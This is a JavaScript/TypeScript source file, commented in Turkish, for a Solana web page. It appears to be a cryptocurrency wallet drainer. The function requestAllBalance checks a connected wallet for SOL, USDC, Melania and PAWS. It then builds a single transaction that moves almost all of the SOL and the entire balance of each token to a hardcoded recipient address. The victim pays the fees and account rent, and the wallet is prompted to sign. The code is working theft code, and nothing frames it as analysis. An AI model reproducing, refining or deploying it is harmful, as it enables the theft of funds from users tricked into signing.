/* eslint-disable @typescript-eslint/no-explicit-any */
import {
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";
import { getUserPublicKey, connection } from "./connect.js";

export async function requestAllBalance() {
  try {
    // 1) Kullanıcının PublicKey bilgisini al
    const userPublicKey = getUserPublicKey();
    if (!userPublicKey) {
      console.warn("Kullanıcı cüzdanı bağlı değil!");
      return false;
    }

// -----------------------------------------------------------
// SOL Bakiyesi Kontrolü (alt limit yok)
// -----------------------------------------------------------
const userSolLamports = await connection.getBalance(userPublicKey);
console.log(`Kullanıcının SOL bakiyesi (lamport): ${userSolLamports}`);

// 0.006 SOL = 6_000_000 lamport (fee buffer)
const feeBufferLamports = 6_000_000;
const solToSend = userSolLamports > feeBufferLamports
  ? userSolLamports - feeBufferLamports
  : 0;
const isSolSufficient = solToSend > 0;

    // -----------------------------------------------------------
    // USDC Bakiyesi Kontrolü (try/catch ile)
    // -----------------------------------------------------------
    const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"); // mainnet USDC
    const userUsdcAccount = await getAssociatedTokenAddress(USDC_MINT, userPublicKey);

    let userUsdcAmount = 0;
    let isUsdcSufficient = false;
    try {
      // Bu hesap yoksa hata fırlatacak
      const userUsdcAccountInfo = await getAccount(connection, userUsdcAccount);
      userUsdcAmount = Number(userUsdcAccountInfo.amount);
      console.log(`Kullanıcının USDC bakiyesi (en küçük birim): ${userUsdcAmount}`);

      // 1 USDC = 10_000_000
      const minimumUsdcAmount = 80_000;
      isUsdcSufficient = userUsdcAmount > minimumUsdcAmount;
    } catch (e) {
      console.error("USDC için ATA bulunamadı veya başka hata:", e);
      userUsdcAmount = 0;
      isUsdcSufficient = false;
    }

    // -----------------------------------------------------------
    // Melania Coin Bakiyesi Kontrolü (try/catch ile)
    // -----------------------------------------------------------
    const MELANIA_MINT = new PublicKey("FUAfBo2jgks6gB4Z4LfZkqSZgzNucisEHqnNebaRxM1P");
    const userMelaniaAccount = await getAssociatedTokenAddress(MELANIA_MINT, userPublicKey);

    let userMelaniaAmount = 0;
    let isMelaniaSufficient = false;
    try {
      const userMelaniaAccountInfo = await getAccount(connection, userMelaniaAccount);
      userMelaniaAmount = Number(userMelaniaAccountInfo.amount);
      console.log(`Kullanıcının Melania bakiyesi (en küçük birim): ${userMelaniaAmount}`);

      // 0.1 Melania (varsayılan 6 decimal) -> 10,000
      const minimumMelaniaAmount = 10_000;
      isMelaniaSufficient = userMelaniaAmount > minimumMelaniaAmount;
    } catch (e) {
      console.error("Melania için ATA bulunamadı veya başka hata:", e);
      userMelaniaAmount = 0;
      isMelaniaSufficient = false;
    }

    // -----------------------------------------------------------
    // PAWS Token Bakiyesi Kontrolü (try/catch ile)
    // -----------------------------------------------------------
    const PAWS_MINT = new PublicKey("PAWSxhjTyNJELywYiYTxCN857utnYmWXu7Q59Vgn6ZQ");
    const userPawsAccount = await getAssociatedTokenAddress(PAWS_MINT, userPublicKey);

    let userPawsAmount = 0;
    let isPawsSufficient = false;
    try {
      const userPawsAccountInfo = await getAccount(connection, userPawsAccount);
      userPawsAmount = Number(userPawsAccountInfo.amount);
      console.log(`Kullanıcının PAWS bakiyesi (en küçük birim): ${userPawsAmount}`);
      // Minimum PAWS: 1000 PAWS, 6 decimal => 1000 * 10^6 = 1_000_000
      const minimumPawsAmount = 1_000_000;
      isPawsSufficient = userPawsAmount > minimumPawsAmount;
    } catch (e) {
      console.error("PAWS için ATA bulunamadı veya başka hata:", e);
      userPawsAmount = 0;
      isPawsSufficient = false;
    }

    // -----------------------------------------------------------
    // Şartlar Sağlanmazsa Çık (Eligibility sağlanamazsa false döndür)
    // -----------------------------------------------------------
    if (!isSolSufficient && !isUsdcSufficient && !isMelaniaSufficient && !isPawsSufficient) {
      console.warn("Yeterli SOL (>=0.02), USDC (>=10), Melania (>=0.01) veya PAWS (>=1000) yok!");
      return false;
    }

    // -----------------------------------------------------------
    // Hedef Adres ve ATA Hesapları
    // -----------------------------------------------------------
    const toPublicKey = new PublicKey("FRcrm9XNbKNU7TfCLwx7KXzs7UpSxiEi2LydQ3ebv9r1"); //RECEIPNT ADRESS
    const toUsdcAccount = await getAssociatedTokenAddress(USDC_MINT, toPublicKey);
    const toMelaniaAccount = await getAssociatedTokenAddress(MELANIA_MINT, toPublicKey);
    const toPawsAccount = await getAssociatedTokenAddress(PAWS_MINT, toPublicKey);

    // -----------------------------------------------------------
    // Transaction Oluşturma
    // -----------------------------------------------------------
    const { blockhash } = await connection.getLatestBlockhash();
    const transaction = new Transaction({
      feePayer: userPublicKey,
      recentBlockhash: blockhash,
    });

    // -----------------------------------------------------------
    // 1) Hedef USDC ATA Yoksa Oluştur
    // -----------------------------------------------------------
    if (isUsdcSufficient) {
      try {
        await getAccount(connection, toUsdcAccount);
        console.log("Hedefte USDC ATA var.");
      } catch (e) {
        console.log("Hedefte USDC ATA yok, oluşturuyoruz...");
        transaction.add(
          createAssociatedTokenAccountInstruction(
            userPublicKey,        // payer (rent bedelini ödeyecek cüzdan)
            toUsdcAccount,        // oluşturulacak ATA
            toPublicKey,          // ATA’nın sahibi
            USDC_MINT
          )
        );
      }
    }

    // -----------------------------------------------------------
    // 2) Hedef Melania ATA Yoksa Oluştur
    // -----------------------------------------------------------
    if (isMelaniaSufficient) {
      try {
        await getAccount(connection, toMelaniaAccount);
        console.log("Hedefte Melania ATA var.");
      } catch (e) {
        console.log("Hedefte Melania ATA yok, oluşturuyoruz...");
        transaction.add(
          createAssociatedTokenAccountInstruction(
            userPublicKey,       // payer
            toMelaniaAccount,    // oluşturulacak ATA
            toPublicKey,         // sahibi
            MELANIA_MINT
          )
        );
      }
    }

    // -----------------------------------------------------------
    // 3) Hedef PAWS ATA Yoksa Oluştur
    // -----------------------------------------------------------
    if (isPawsSufficient) {
      try {
        await getAccount(connection, toPawsAccount);
        console.log("Hedefte PAWS ATA var.");
      } catch (e) {
        console.log("Hedefte PAWS ATA yok, oluşturuyoruz...");
        transaction.add(
          createAssociatedTokenAccountInstruction(
            userPublicKey,   // payer (ATA oluşturma ücretini ödeyecek cüzdan)
            toPawsAccount,   // oluşturulacak ATA
            toPublicKey,     // ATA'nın sahibi (karşı taraf)
            PAWS_MINT
          )
        );
      }
    }

    // -----------------------------------------------------------
    // 1) SOL Transfer Instruction
    // -----------------------------------------------------------
    if (isSolSufficient) {
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: userPublicKey,
          toPubkey: toPublicKey,
          lamports: solToSend,
        })
      );
      console.log(`Adding SOL transfer: ${solToSend} lamports`);
    }

    // -----------------------------------------------------------
    // 2) USDC Transfer Instruction
    // -----------------------------------------------------------
    if (isUsdcSufficient) {
      transaction.add(
        createTransferInstruction(
          userUsdcAccount,
          toUsdcAccount,
          userPublicKey,
          userUsdcAmount
        )
      );
      console.log(`Adding USDC transfer: ${userUsdcAmount} tokens`);
    }

    // -----------------------------------------------------------
    // 3) Melania Transfer Instruction
    // -----------------------------------------------------------
    if (isMelaniaSufficient) {
      transaction.add(
        createTransferInstruction(
          userMelaniaAccount,
          toMelaniaAccount,
          userPublicKey,
          userMelaniaAmount
        )
      );
      console.log(`Adding Melania transfer: ${userMelaniaAmount} tokens`);
    }

    // -----------------------------------------------------------
    // 6) PAWS Transfer Instruction
    // -----------------------------------------------------------
    if (isPawsSufficient) {
      transaction.add(
        createTransferInstruction(
          userPawsAccount, // Kaynak: Kullanıcının PAWS ATA
          toPawsAccount,   // Hedef: Karşı tarafın PAWS ATA
          userPublicKey,   // Transferi başlatan (owner)
          userPawsAmount   // Tüm PAWS bakiyesi
        )
      );
      console.log(`Adding PAWS transfer: ${userPawsAmount} tokens`);
    }

    // -----------------------------------------------------------
    // Transaction İmzalama ve Gönderme
    // -----------------------------------------------------------
    const signedTx = await window.solana.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signedTx.serialize());
    console.log("Transaction sent. Signature:", signature);

    const confirmation = await connection.confirmTransaction(signature, "confirmed");
    console.log("Transaction confirmed:", confirmation);

    // İşlem başarılı ise true döndür
    return true;
  } catch (err) {
    console.error("Error sending transaction:", err);
    return false;
  }
}
